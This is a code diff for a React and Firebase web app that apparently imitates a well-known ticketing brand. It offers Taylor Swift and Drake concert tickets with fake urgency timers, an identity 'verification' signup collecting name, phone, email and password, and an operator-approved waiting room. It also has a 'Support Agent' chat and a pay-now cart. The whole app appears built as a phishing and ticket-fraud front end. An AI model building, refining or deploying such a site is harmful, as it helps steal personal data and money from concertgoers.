@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { Search, CheckCircle, MessageSquare, Send, X, Bell, ChevronLeft, User, Menu, LogIn, Check, Ban, AlertOctagon, Info, Settings, Calendar, Trash2 } from 'lucide-react';
+import { Search, CheckCircle, MessageSquare, Send, X, Bell, ChevronLeft, User, LogIn, Check, Ban, AlertOctagon, Info, Settings, Calendar, Trash2 } from 'lucide-react';
 import { initializeApp } from 'firebase/app';
 import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, updateProfile, onAuthStateChanged, signInAnonymously, signOut } from 'firebase/auth';
 import { getFirestore, collection, addDoc, updateDoc, doc, setDoc, getDoc, onSnapshot, query, where, orderBy, deleteDoc } from 'firebase/firestore';
@@ -21,6 +21,7 @@ const auth = getAuth(app);
 const db = getFirestore(app);
 const appId = import.meta.env.VITE_APP_ID || 'default-app-id';
 
+// --- TRANSLATIONS (Restored Full) ---
 const t = {
   EN: { heroTitle: "The World's Biggest Stage.", verified: "Verified Only", btnJoin: "Verify & Join", btnLogin: "Log In", holdTitle: "Verifying Identity...", holdSub: "Please hold while the Host reviews your request.", deniedTitle: "ACCESS DENIED", deniedSub: "Identity Unverified.", queueTitle: "Fans Ahead of You", presaleTitle: "Early Access", unlock: "Unlock", name: "Full Name", phone: "Mobile Number", email: "Email Address", pass: "Password", agree: "I agree to Terms", haveAcc: "Have Account?", noAcc: "Create Account" },
   ES: { heroTitle: "El Escenario Más Grande.", verified: "Solo Verificados", btnJoin: "Unirse", btnLogin: "Entrar", holdTitle: "Verificando...", holdSub: "Espere por favor.", deniedTitle: "DENEGADO", deniedSub: "No verificado.", queueTitle: "Fans Delante", presaleTitle: "Acceso Anticipado", unlock: "Desbloquear", name: "Nombre", phone: "Móvil", email: "Correo", pass: "Contraseña", agree: "Acepto", haveAcc: "¿Cuenta?", noAcc: "¿Crear?" },
@@ -28,10 +29,15 @@ const t = {
   FR: { heroTitle: "La Plus Grande Scène.", verified: "Vérifié", btnJoin: "Rejoindre", btnLogin: "Connexion", holdTitle: "Vérification...", holdSub: "Veuillez patienter.", deniedTitle: "REFUSÉ", deniedSub: "Identité non vérifiée.", queueTitle: "Fans devant vous", presaleTitle: "Accès Anticipé", unlock: "Ouvrir", name: "Nom", phone: "Mobile", email: "E-mail", pass: "Mot de passe", agree: "Accepter", haveAcc: "Compte ?", noAcc: "Pas de compte ?" }
 };
 
+const INITIAL_EVENTS = [
+  { id: 1, artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", badge: "High Demand", timer: "02:45:12" },
+  { id: 2, artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", badge: "Selling Fast", timer: "" }
+];
+
 export default function UserApp() {
   const [user, setUser] = useState(null);
   const [isLoading, setIsLoading] = useState(true);
-  const [authLoading, setAuthLoading] = useState(false); // Spinner for Login Button
+  const [authLoading, setAuthLoading] = useState(false);
   const [currentPage, setCurrentPage] = useState('auth'); 
   const [selectedEvent, setSelectedEvent] = useState(null);
   const [cart, setCart] = useState([]); 
@@ -59,7 +65,7 @@ export default function UserApp() {
   const [activeNotification, setActiveNotification] = useState(null);
   const [showNotifPanel, setShowNotifPanel] = useState(false);
   const [userNotifications, setUserNotifications] = useState([]);
-  const [unreadNotifCount, setUnreadNotifCount] = useState(0); // Track unread notifications
+  const [unreadNotifCount, setUnreadNotifCount] = useState(0);
 
   useEffect(() => {
     return onAuthStateChanged(auth, async (u) => {
@@ -68,9 +74,13 @@ export default function UserApp() {
             setIsLoading(false); 
         } else { 
             setUser(u); 
-            // If logged in, send to Home (skips auth)
-            await findOrCreateSession(u);
-            setCurrentPage('home');
+            // If logged in, send to Home (skips auth wall)
+            if(currentPage === 'auth') {
+                await findOrCreateSession(u);
+                setCurrentPage('home');
+            } else {
+                await findOrCreateSession(u);
+            }
             setIsLoading(false); 
         }
     });
@@ -100,8 +110,8 @@ export default function UserApp() {
       if (snap.exists()) {
           const d = snap.data();
           if (d.accessGranted === 'denied') setCurrentPage('denied');
-          else if (d.accessGranted === 'allowed') setCurrentPage('home'); 
-          else if (d.status === 'waiting_approval') setCurrentPage('waiting_room');
+          // If approved, verify they aren't stuck in waiting
+          else if (d.accessGranted === 'allowed' && currentPage === 'waiting_room') setCurrentPage('queue');
       }
   };
 
@@ -117,15 +127,13 @@ export default function UserApp() {
         
         const notifs = d.notifications || [];
         setUserNotifications(notifs);
-        // Only trigger pulse if new notification
         if(notifs.length > 0 && (!activeNotification || notifs[notifs.length-1].timestamp !== activeNotification?.timestamp)) {
             setActiveNotification(notifs[notifs.length-1]);
             setUnreadNotifCount(prev => prev + 1);
         }
         
-        // Strict Redirects only for Denied/Waiting. Relaxed for Home/Queue to fix "Bounce Back".
         if (d.accessGranted === 'denied') setCurrentPage('denied');
-        else if (d.status === 'waiting_approval' && currentPage === 'home') setCurrentPage('waiting_room');
+        else if (d.accessGranted === 'allowed' && currentPage === 'waiting_room') setCurrentPage('queue');
       }
     });
   }, [currentSessionId, currentPage, isChatOpen, activeNotification]);
@@ -138,11 +146,9 @@ export default function UserApp() {
     const unsubEvents = onSnapshot(collection(db, 'artifacts', appId, 'public', 'data', 'events'), (snap) => {
         if (!snap.empty) setEventsList(snap.docs.map(d => ({id: d.id, ...d.data()})));
         else {
-            const seed = [
-                { artist: "Taylor Swift | The Eras Tour", venue: "Wembley Stadium, London", date: "Sat • Aug 17 • 7:00 PM", image: "https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=1000", badge: "High Demand", timer: "02:45:12" },
-                { artist: "Drake: It's All A Blur", venue: "O2 Arena, London", date: "Fri • Sep 22 • 8:00 PM", image: "https://images.unsplash.com/photo-1514525253440-b393452e8d26?auto=format&fit=crop&q=80&w=1000", badge: "Selling Fast", timer: "" }
-            ];
-            seed.forEach(e => addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'events'), e));
+            const seed = INITIAL_EVENTS; // Fallback to hardcoded if DB empty
+            // To seed DB, Admin panel handles this.
+            if(eventsList.length === 0) setEventsList(seed);
         }
     });
     return () => { unsubSettings(); unsubEvents(); };
@@ -190,7 +196,7 @@ export default function UserApp() {
   return (
     <div className="min-h-screen bg-[#0a0e14] text-gray-100 font-sans overflow-x-hidden selection:bg-[#026cdf] selection:text-white">
       
-      {!isAdminLoggedIn && currentPage !== 'auth' && (
+      {!user && currentPage === 'auth' ? null : (
         <header className="fixed top-0 w-full z-50 bg-[#1f262d]/90 backdrop-blur-xl border-b border-white/5 h-16 flex items-center justify-between px-4 lg:px-8 shadow-2xl">
             <div className="flex items-center gap-3 z-20">
                 {currentPage !== 'home' && <button onClick={() => setCurrentPage('home')} className="p-2 rounded-full hover:bg-white/10 active:scale-95 transition-all"><ChevronLeft className="w-5 h-5" /></button>}
@@ -209,34 +215,31 @@ export default function UserApp() {
                         </div>
                     )}
                 </div>
-                {currentPage === 'home' && (<><button onClick={() => setShowMobileSearch(!showMobileSearch)} className="lg:hidden p-2 text-gray-400 hover:text-white"><Search className="w-5 h-5" /></button><div className="hidden lg:flex relative group"><input className="bg-white/10 border border-white/10 rounded-full py-2 pl-10 pr-4 text-sm w-48 focus:w-64 transition-all outline-none focus:bg-white focus:text-black" placeholder="Search..." value={searchTerm} onChange={e => setSearchTerm(e.target.value)} /><Search className="absolute left-3 top-2.5 w-4 h-4 text-gray-400 group-focus-within:text-[#026cdf]" /></div></>)}
                 <div className="relative"><button onClick={() => setShowLangMenu(!showLangMenu)} className="flex items-center gap-1 text-sm font-bold bg-white/10 px-3 py-1.5 rounded-full hover:bg-white/20 transition-all"><span>{flags[lang]}</span><span>{lang}</span></button>{showLangMenu && <div className="absolute top-10 right-0 bg-[#1f262d] border border-white/10 rounded-xl p-2 shadow-xl flex flex-col gap-1 w-24 animate-slideDown">{Object.keys(flags).map(l => (<button key={l} onClick={() => {setLang(l); setShowLangMenu(false);}} className="text-left px-3 py-2 hover:bg-white/10 rounded-lg text-xs font-bold">{flags[l]} {l}</button>))}</div>}</div>
             </div>
-            {showMobileSearch && currentPage === 'home' && <div className="absolute top-16 left-0 w-full bg-[#1f262d] p-4 border-b border-white/10 animate-slideDown lg:hidden z-10"><input autoFocus className="w-full bg-black/20 border border-white/10 rounded-xl py-3 px-4 text-sm text-white outline-none" placeholder="Search events..." value={searchTerm} onChange={e => setSearchTerm(e.target.value)} /></div>}
         </header>
       )}
 
       <main className={`min-h-screen ${currentPage === 'auth' ? 'bg-white' : 'pt-20 pb-24 px-4 lg:px-8 max-w-7xl mx-auto bg-[#f1f5f9] text-gray-900'}`}>
         
-        {/* AUTH */}
         {currentPage === 'auth' && (
            <div className="fixed inset-0 z-[100] bg-[#0a0e14] flex items-center justify-center p-4">
               <div className="bg-white text-black w-full max-w-md p-8 rounded-[40px] shadow-2xl animate-slideUp space-y-6">
                  <div className="text-center">
-                    <h2 className="text-3xl font-black italic uppercase tracking-tighter text-black">{authMode==='signup' ? (txt?.verifyTitle || "Create Account") : (txt?.loginTitle || "Welcome Back")}</h2>
-                    <p className="text-xs font-bold text-gray-600 uppercase tracking-widest">{authMode==='signup' ? (txt?.verifySub || "Verify Identity") : (txt?.loginSub || "Log in to enter")}</p>
+                    <h2 className="text-3xl font-black italic uppercase tracking-tighter text-black">{authMode==='signup' ? "Create Account" : "Welcome Back"}</h2>
+                    <p className="text-xs font-bold text-gray-600 uppercase tracking-widest">{authMode==='signup' ? "Verify Identity" : "Log in to enter"}</p>
                  </div>
                  <div className="space-y-3">
-                     {authMode === 'signup' && <><input className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none border border-gray-200" placeholder={t.EN.name} value={tempUser.name} onChange={e => setTempUser({...tempUser, name: e.target.value})} /><input className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none border border-gray-200" placeholder={t.EN.phone} value={tempUser.phone} onChange={e => setTempUser({...tempUser, phone: e.target.value})} /></>}
-                     <input className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none border border-gray-200" placeholder={t.EN.email} value={tempUser.email} onChange={e => setTempUser({...tempUser, email: e.target.value})} />
-                     <input type="password" className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none border border-gray-200" placeholder={t.EN.pass} value={tempUser.pass} onChange={e => setTempUser({...tempUser, pass: e.target.value})} />
+                     {authMode === 'signup' && <><input className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none border border-gray-200" placeholder="Full Name" value={tempUser.name} onChange={e => setTempUser({...tempUser, name: e.target.value})} /><input className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none border border-gray-200" placeholder="Mobile Number" value={tempUser.phone} onChange={e => setTempUser({...tempUser, phone: e.target.value})} /></>}
+                     <input className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none border border-gray-200" placeholder="Email Address" value={tempUser.email} onChange={e => setTempUser({...tempUser, email: e.target.value})} />
+                     <input type="password" className="w-full bg-gray-100 p-4 rounded-xl font-bold text-black placeholder:text-gray-500 outline-none border border-gray-200" placeholder="Password" value={tempUser.pass} onChange={e => setTempUser({...tempUser, pass: e.target.value})} />
                      {authMode === 'signup' && <div className="flex items-center gap-3 pt-2"><input type="checkbox" className="w-5 h-5 accent-[#026cdf]" checked={tempUser.agreed} onChange={e => setTempUser({...tempUser, agreed: e.target.checked})} /><p className="text-[10px] font-bold text-gray-600">I agree to Terms</p></div>}
                  </div>
-                 {authError && <p className="text-center text-red-500 font-bold text-xs">{authError}</p>}
+                 {authError && <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative" role="alert"><strong className="font-bold">Error: </strong><span className="block sm:inline">{authError}</span></div>}
                  <button onClick={authMode === 'signup' ? handleRealSignup : handleRealLogin} disabled={authLoading} className="w-full bg-[#026cdf] text-white py-5 rounded-full font-black text-xl uppercase italic tracking-widest hover:scale-[1.02] active:scale-95 transition-all shadow-lg flex items-center justify-center gap-3">
-                     {authLoading ? <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" /> : (authMode === 'signup' ? (txt?.btnJoin || "Join") : (txt?.btnLogin || "Log In"))}
+                     {authLoading ? <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" /> : (authMode === 'signup' ? "Join" : "Log In")}
                  </button>
-                 <div className="text-center pt-2"><button onClick={() => setAuthMode(authMode==='signup'?'login':'signup')} className="text-xs font-bold text-gray-600 hover:text-[#026cdf] uppercase tracking-widest">{authMode === 'signup' ? (txt?.haveAcc || "Have Account?") : (txt?.noAcc || "Create Account")}</button></div>
+                 <div className="text-center pt-2"><button onClick={() => setAuthMode(authMode==='signup'?'login':'signup')} className="text-xs font-bold text-gray-600 hover:text-[#026cdf] uppercase tracking-widest">{authMode === 'signup' ? "Have Account?" : "Create Account"}</button></div>
               </div>
            </div>
         )}
@@ -247,7 +250,7 @@ export default function UserApp() {
               <img src="https://images.unsplash.com/photo-1540039155733-5bb30b53aa14?auto=format&fit=crop&q=80&w=2000" className="w-full h-full object-cover opacity-60 group-hover:scale-105 transition-transform duration-1000" /><div className="absolute inset-0 bg-gradient-to-t from-[#0a0e14] via-transparent to-transparent" />
               <div className="absolute bottom-10 left-6 lg:left-12 space-y-2"><div className="inline-block bg-[#026cdf] px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest mb-2">{txt?.verified}</div><h1 className="text-4xl lg:text-7xl font-black italic uppercase tracking-tighter leading-none">{txt?.heroTitle}</h1></div>
             </div>
-            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">{filteredEvents.map(ev => (<div key={ev.id} onClick={() => { setSelectedEvent(ev); updateSession({ status: 'in_queue' }); setCurrentPage('queue'); }} className="bg-[#1f262d] border border-white/5 rounded-[30px] overflow-hidden hover:border-[#026cdf] hover:translate-y-[-5px] transition-all cursor-pointer group shadow-xl"><div className="h-56 relative"><img src={ev.image} className="w-full h-full object-cover" /><div className="absolute top-4 right-4 flex flex-col items-end gap-2">{ev.badge && <span className="bg-[#ea0042] text-white px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10 shadow-lg animate-pulse">{ev.badge}</span>}{ev.timer && <span className="bg-black/60 backdrop-blur-md text-white px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10">{ev.timer}</span>}</div></div><div className="p-6 space-y-4"><h3 className="text-2xl font-black italic uppercase leading-none group-hover:text-[#026cdf] transition-colors">{ev.artist}</h3><div className="space-y-1 text-xs font-bold text-gray-400 uppercase tracking-widest"><p>{ev.venue}</p><p className="text-gray-500">{ev.date}</p></div></div></div>))}</div>
+            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">{filteredEvents.map(ev => (<div key={ev.id} onClick={() => { setSelectedEvent(ev); updateSession({ status: 'waiting_approval' }); setCurrentPage('waiting_room'); }} className="bg-[#1f262d] border border-white/5 rounded-[30px] overflow-hidden hover:border-[#026cdf] hover:translate-y-[-5px] transition-all cursor-pointer group shadow-xl"><div className="h-56 relative"><img src={ev.image} className="w-full h-full object-cover" /><div className="absolute top-4 right-4 flex flex-col items-end gap-2">{ev.badge && <span className="bg-[#ea0042] text-white px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10 shadow-lg animate-pulse">{ev.badge}</span>}{ev.timer && <span className="bg-black/60 backdrop-blur-md text-white px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest border border-white/10">{ev.timer}</span>}</div></div><div className="p-6 space-y-4"><h3 className="text-2xl font-black italic uppercase leading-none group-hover:text-[#026cdf] transition-colors">{ev.artist}</h3><div className="space-y-1 text-xs font-bold text-gray-400 uppercase tracking-widest"><p>{ev.venue}</p><p className="text-gray-500">{ev.date}</p></div></div></div>))}</div>
           </div>
         )}
 
@@ -295,11 +298,9 @@ export default function UserApp() {
              <button onClick={() => setCurrentPage('home')} className="bg-[#1f262d] px-10 py-4 rounded-full font-black uppercase tracking-widest border border-white/20 hover:bg-white hover:text-black transition-colors">Return Home</button>
           </div>
         )}
-
       </main>
 
-      {currentPage !== 'auth' && <div className="fixed bottom-6 right-6 z-[200]"><button onClick={()=>{setIsChatOpen(!isChatOpen); if(!isChatOpen) setHasUnread(false);}} className="bg-[#026cdf] w-14 h-14 rounded-full flex items-center justify-center shadow-2xl hover:scale-110 transition-transform relative">{isChatOpen ? <X className="w-6 h-6 text-white" /> : <MessageSquare className="w-6 h-6 text-white" />}{hasUnread && !isChatOpen && <div className="absolute top-0 right-0 w-4 h-4 bg-red-500 rounded-full border-2 border-white animate-bounce" />}</button></div>}
-      
+      {!isAdminLoggedIn && currentPage !== 'auth' && <div className="fixed bottom-6 right-6 z-[200]"><button onClick={()=>{setIsChatOpen(!isChatOpen); if(!isChatOpen) setHasUnread(false);}} className="bg-[#026cdf] w-14 h-14 rounded-full flex items-center justify-center shadow-2xl hover:scale-110 transition-transform relative">{isChatOpen ? <X className="w-6 h-6 text-white" /> : <MessageSquare className="w-6 h-6 text-white" />}{hasUnread && !isChatOpen && <div className="absolute top-0 right-0 w-4 h-4 bg-red-500 rounded-full border-2 border-white animate-bounce" />}</button></div>}
       {isChatOpen && <div className="fixed bottom-24 right-6 w-[90vw] max-w-sm h-[450px] bg-white rounded-[30px] shadow-2xl overflow-hidden flex flex-col z-[200] animate-slideUp"><div className="bg-[#1f262d] p-4 flex items-center gap-3 border-b border-white/10"><div className="w-10 h-10 bg-[#026cdf] rounded-full flex items-center justify-center font-black text-white text-xs">TM</div><div><p className="font-bold text-white text-sm">Support Agent</p><p className="text-[10px] text-green-400 font-bold uppercase tracking-widest">Online</p></div></div><div className="flex-1 overflow-y-auto p-4 space-y-3 bg-gray-50">{chatMessages.map((m,i) => (<div key={i} className={`flex ${m.sender==='user'?'justify-end':'justify-start'}`}><div className={`max-w-[80%] p-3 rounded-2xl text-xs font-bold ${m.sender==='user'?'bg-[#026cdf] text-white rounded-br-none':'bg-white text-black border border-gray-100 rounded-bl-none'}`}>{m.text}</div></div>))}</div><div className="p-3 bg-white border-t flex gap-2"><input id="chat-inp" className="flex-1 bg-gray-100 rounded-xl px-4 text-sm text-black font-bold outline-none" placeholder="Message..." /><button onClick={() => { const el = document.getElementById('chat-inp'); if(el.value.trim()) { const newHistory = [...chatMessages, {sender:'user', text:el.value, timestamp: new Date().toISOString()}]; setChatMessages(newHistory); updateSession({ chatHistory: newHistory }); el.value = ''; } }} className="bg-[#026cdf] p-3 rounded-xl"><Send className="w-4 h-4 text-white" /></button></div></div>}
       
       {cart.length > 0 && <div onClick={() => setShowCart(true)} className="fixed bottom-0 left-0 w-full bg-white border-t border-gray-100 p-6 z-50 animate-slideUp shadow-[0_-10px_40px_rgba(0,0,0,0.1)] cursor-pointer hover:bg-gray-50 transition-colors"><div className="max-w-7xl mx-auto flex items-center justify-between"><div><p className="text-xs font-black text-gray-400 uppercase tracking-widest">Total (Tap to view)</p><p className="text-3xl font-black text-gray-900">${cart.reduce((a,b) => a + b.price, 0)}</p></div><button onClick={(e) => { e.stopPropagation(); setCurrentPage('checkout'); }} className="bg-[#026cdf] text-white px-8 lg:px-12 py-4 rounded-full font-black uppercase italic tracking-widest shadow-[0_10px_30px_rgba(2,108,223,0.4)] hover:scale-105 active:scale-95 transition-all">Proceed to Pay</button></div></div>}
